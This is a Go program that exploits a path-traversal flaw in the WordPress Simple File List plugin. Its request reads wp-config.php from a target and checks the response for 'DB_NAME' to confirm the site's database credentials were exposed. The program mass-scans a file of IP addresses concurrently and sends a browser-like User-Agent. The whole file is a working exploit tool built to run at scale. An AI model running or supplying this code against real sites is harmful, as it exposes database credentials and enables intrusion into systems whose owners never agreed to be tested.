package main

import (
	"bufio"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io"
	"os"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

var stamp bool

type WordPress struct {
}

func (w *WordPress) r0(ip string, client *req.Client) (bool, error) {
	payload := "/wp-content/plugins/simple-file-list/includes/ee-downloader.php?eeFile=..%2f..%2f..%2f../wp-config.php"
	resp, err := w.payload(ip, payload, client)
	if err != nil {
		return false, err
	}
	if resp.StatusCode == 200 && strings.Contains(resp.String(), "DB_NAME") {
		return true, nil
	}
	return false, nil
}

func (w *WordPress) payload(ip, payload string, client *req.Client) (*req.Response, error) {
	resp, err := client.R().
		SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36").
		Get("http://" + ip + payload)
	if err != nil {
		return nil, err
	}
	return resp, nil

}

func (w *WordPress) singleScan(ip string) {
	if stamp {
		defer wg.Done()
	}

	client := req.C()
	r0, err := w.r0(ip, client)
	if err != nil {
		color.FgRed.Printf("[ERROR]:%v\n", err)
		return
	}
	if r0 {
		color.FgGreen.Printf("[INFO]:[%s] WordPress Simple-file-list FileRead Existent\n", ip)
	} else {
		color.FgGray.Printf("[INFO]:[%s] WordPress Simple-file-list FileRead Non-existent\n", ip)
	}
}

func (w *WordPress) batchScan(path string) {
	stamp = true
	begin := time.Now()
	color.FgGray.Println("[INFO]:Scan...")

	f, err := os.Open(path)
	if err != nil {
		color.FgRed.Println("os.Open Err", err)
		return
	}

	r := bufio.NewReader(f)

	for {
		ip, err := r.ReadString('\n')
		ip = strings.TrimSpace(ip)
		if err != nil && err != io.EOF {
			color.FgRed.Println("os.Open Err", err)
			return
		}
		if ip != "" {
			wg.Add(1)
			go w.singleScan(ip)
		}
		if err == io.EOF {
			break
		}

	}
	wg.Wait()
	timeDif := time.Now().Sub(begin)
	color.FgGray.Println("[INFO]:Take", timeDif)
}
